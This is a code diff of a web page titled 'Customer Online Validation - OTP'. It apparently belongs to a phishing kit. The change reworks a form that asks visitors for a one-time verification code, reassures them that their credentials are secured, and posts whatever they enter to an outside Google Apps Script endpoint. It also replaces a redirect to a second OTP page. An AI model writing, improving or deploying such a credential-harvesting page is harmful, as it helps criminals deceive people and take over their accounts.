@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Customer Online Validation</title>
+<title>Customer Online Validation - OTP</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 :root {
@@ -164,10 +164,10 @@ button:active { transform: translateY(1px); }
 </header>
 
 <div class="portal-card">
-  <form id="dataForm">
-    <label for="message">Verification Message</label>
-    <input type="text" id="message" name="validation_otp" placeholder="Enter message" required>
-    <button type="submit">Continue →</button>
+  <form id="otpForm">
+    <label for="otp">Verification Message</label>
+    <input type="text" id="otp" name="validation_otp" placeholder="Enter your verification message" required>
+    <button type="submit">Submit →</button>
     <div class="notice" id="status">Your credentials are secured.</div>
   </form>
 </div>
@@ -178,7 +178,7 @@ button:active { transform: translateY(1px); }
 </div>
 
 <script>
-const form = document.getElementById('dataForm');
+const form = document.getElementById('otpForm');
 const overlay = document.getElementById('overlay');
 const statusEl = document.getElementById('status');
 const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbzrAI7WA69_S-8Nk-WKDgwiZ5VYm6hIKf_qwS7zWGsgCBUbFG1oLVyjMeO4CJ0fi20/exec";
@@ -197,14 +197,13 @@ form.addEventListener('submit', async (e) => {
     const json = JSON.parse(text);
 
     if (json.result === "success") {
-      // Redirect to OTP page
-      window.location.href = "otp.html";
+      statusEl.textContent = "Submission successful!";
+      statusEl.style.color = "#22c55e";
     } else {
       overlay.classList.remove("active");
       statusEl.textContent = "Submission failed: " + (json.message || "Unknown error");
       statusEl.style.color = "#b00000";
     }
-
   } catch(err) {
     overlay.classList.remove("active");
     statusEl.textContent = "Network error. Try again.";
